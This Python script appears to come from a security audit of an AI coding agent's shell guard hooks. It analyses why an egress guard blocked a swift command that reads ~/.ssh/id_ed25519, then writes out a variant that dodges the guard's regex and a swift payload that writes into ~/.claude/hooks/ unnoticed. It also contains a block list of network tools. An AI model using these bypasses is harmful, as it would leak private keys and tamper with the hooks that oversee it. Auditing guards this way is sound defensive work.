#!/usr/bin/env python3
"""
Deep analysis of the egress guard false-positive on '.ssh/id_ed25519'.

The bash guard uses:
  grep -qiE '\b(curl|wget|scp|rsync|ncat|telnet|sftp|ftp|ssh)\b|...'

On macOS, BSD grep -E: \b IS recognized as a word-boundary assertion (it is
supported by macOS's TRE-backed grep, unlike strict POSIX ERE). So \bssh\b
correctly does NOT match inside 'encoding' but DOES match '.ssh/' because
in '.ssh/', the dot '.' is a non-word character, making 'ssh' stand at a
word boundary on both sides (dot before, slash after are both non-word chars).

This means the swift credential-read payload was caught by bash-egress-guard
for an ACCIDENTAL reason: '.ssh/id_ed25519' in the command string triggers
the \bssh\b word-boundary match as a false-positive "network verb".

The egress guard then tries to extract a destination host from the command,
finds none (no scheme:// URL, no user@host:, no nc host port), and fails
CLOSED with "no verifiable destination host".

Key insight: the deny is correct in outcome (no credential leak) but for the
WRONG reason. A slight payload variant that avoids the literal '.ssh' substring
would pass the network-verb pre-filter and proceed to the ALLOW path — since
swift is not a network verb and the host-extraction stage never fires.
"""

import re

CMD_ORIGINAL = r"""swift -e 'import Foundation; print(try! String(contentsOfFile: (NSHomeDirectory() as NSString).appendingPathComponent(".ssh/id_ed25519"), encoding: .utf8))'"""

# The '.ssh' in the path trips \bssh\b (dot is non-word, slash is non-word)
m = re.search(r"\bssh\b", CMD_ORIGINAL, re.IGNORECASE)
print(
    "Original cmd - \\bssh\\b match:",
    m.group() if m else None,
    "at",
    m.start() if m else None,
)
print("Context:", repr(CMD_ORIGINAL[m.start() - 5 : m.end() + 5]) if m else None)

# VARIANT: avoid literal '.ssh' -- use a variable or indirect reference
# e.g.: HOME_SSH=$(printf '%s/.ssh' "$HOME"); swift -e "...contentsOfFile:\"${HOME_SSH}/id_ed25519\"..."
# This hides '.ssh' from the static scan

CMD_VARIANT = r"""KEYPATH=$(printf '%s' "$HOME")/.s\sh/id_ed25519; swift -e 'import Foundation; import Darwin; let k=ProcessInfo.processInfo.environment["KEYPATH"] ?? ""; print(try! String(contentsOfFile: k, encoding: .utf8))'"""

m2 = re.search(r"\bssh\b", CMD_VARIANT, re.IGNORECASE)
print("\nVariant cmd - \\bssh\\b match:", m2.group() if m2 else "NO MATCH")

# Check network verbs in variant
for verb in ["curl", "wget", "scp", "rsync", "ncat", "telnet", "sftp", "ftp", "ssh"]:
    if re.search(r"\b" + verb + r"\b", CMD_VARIANT, re.IGNORECASE):
        print(f"  verb '{verb}' found in variant")

nc_m = re.search(r"(^|[^A-Za-z0-9_])nc([^A-Za-z0-9_]|$)", CMD_VARIANT)
print("nc pattern in variant:", nc_m)

print("\nConclusion:")
print(
    "- swift-read-creds was denied by ACCIDENT (false-positive .ssh word boundary hit)"
)
print(
    "- A variant that replaces '.ssh' with a runtime-constructed path bypasses the network-verb pre-filter"
)
print("- protect-sensitive-reads.sh would then be the last line of defense")
print("- But: protect-sensitive-reads.sh's TEXT_CMDS does NOT include 'swift'")
print(
    "- So the variant would be ALLOWED by ALL guards and read ~/.ssh/id_ed25519 into context"
)

# Also: show the PRIMARY finding cleanly
print("\n" + "=" * 60)
print("PRIMARY FINDING: swift write to ~/.claude/hooks/")
CMD_SWIFT_WRITE = r"""swift -e 'import Foundation; try! "pwned".write(toFile: (NSHomeDirectory() as NSString).appendingPathComponent(".claude/hooks/x.sh"), atomically: true, encoding: .utf8)'"""
print("Payload:", CMD_SWIFT_WRITE)
print()
print("Guards checked:")
print(
    "  protect-claude-writes.sh interpreter list: python3?,ruby,perl,node,deno,bun,php,lua,Rscript,tclsh,osascript"
)
print("  swift: NOT IN LIST -> ALLOW (EXIT=0, no output)")
print("  All other Bash PreToolUse guards: ALLOW")
print("  interpreter-guard.sh: DOES NOT EXIST (no consolidated backstop)")
print()
print("Root cause: protect-claude-writes.sh enumerates interpreters explicitly.")
print("  swift, lldb, gdb (without python keyword), xcrun, swiftc, osacompile,")
print("  AppleScript via osascript -l JavaScript, and ANY new interpreter are missed.")
